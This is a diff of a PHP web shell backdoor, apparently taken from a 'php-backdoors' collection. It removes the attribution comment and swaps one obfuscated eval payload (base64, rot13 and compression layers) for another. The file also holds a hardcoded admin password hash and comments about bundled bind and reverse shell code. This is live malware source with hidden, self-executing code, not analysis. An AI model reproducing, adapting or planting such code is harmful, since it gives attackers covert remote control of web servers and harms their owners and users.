@@ -1,5 +1,4 @@
 <?php
-// from https://github.com/1337r0j4n/php-backdoors
 
 $s_pass = "90b9aa7e25f80cf4f64e990b78a9fc5ebd6cecad"; // password : admin
 
@@ -89,7 +88,7 @@ elseif(!isset($_SERVER['HTTP_USER_AGENT'])){
     header("Status: 404 Not Found");
     die();
 }
-$ups_2 = "/we"."bs"."he"."ll";  eval(str_rot13(gzinflate(str_rot13(base64_decode('cpBEeIMwEIDf/RVOhCh1XO3TLB2sndq9jOHDHiYSWaYRW6yeWiD++rWm0MHyktx93GqXZksrayvQFjk0zZP3PCmwuenrx2qOWFGQHdvkP97vknnBD5LkYoc8zegh+cLlxpqUBm0BTgdJCahR428pBI/DY/UckTWJojVMPYWXV8lTVh51DbI5UFS45NhURq8b8EQjd+h04zheXddVgFtL6G0WH1PbF3Fvk4N+hBqjW9r+NK0DZOIQo55mrYZeKEmFx6DrumBv9Ry0tYZ3YCOMtv/wzCAkG40H72p2hv/A+5eW3rch6LlIbaQ/LdQnt8BzqwtozLv0WWjpW6Xnen4B')))));
+$ups_2 = "/we"."bs"."he"."ll"; eval(gzuncompress(str_rot13(base64_decode('a5xIQ1p4hEAM/SuDLFHBj7XQpUishyJ5Qt2q24vIYDWugjrTZMRdV/97VO2hhUDyXmvJWEMIJqhAzoR5h4u+N3yym1EX6DuaUfF7FHRjWdNGAmwYAqt4MIIgADZACI2UfARizWB4nuN8/RfR43iST/79h46jt2aUpPQcv6iG5pO67ZBeQ9KSDRIHOerrPDXs3rUPD7Z7a7Tv3L1GjqPNGw4mqYthUZOMRWDRYrKrkiskRM/Ic4cEQnGpsahDrFV73hZL8sbRIwXnXVsWsnKDZrXmbLZ3Jm1YnY5QySqsNJNAj7Ju1SqH02WL4n59ruSyin5ZekrRzwnFWs+AWpJCW2r5cGGYJEpuGP4PeTtnqg=='))));
 
 // resources $s_rs_pl $s_rs_py $s_rs_rb $s_rs_js $s_rs_c $s_rs_java $s_rs_java $s_rs_win $s_rs_php this was used with bind and reverse shell
 // use gzinflate(base64_decode($the_code)) if you wanna see the real code.. in case you dont trust me ;-P
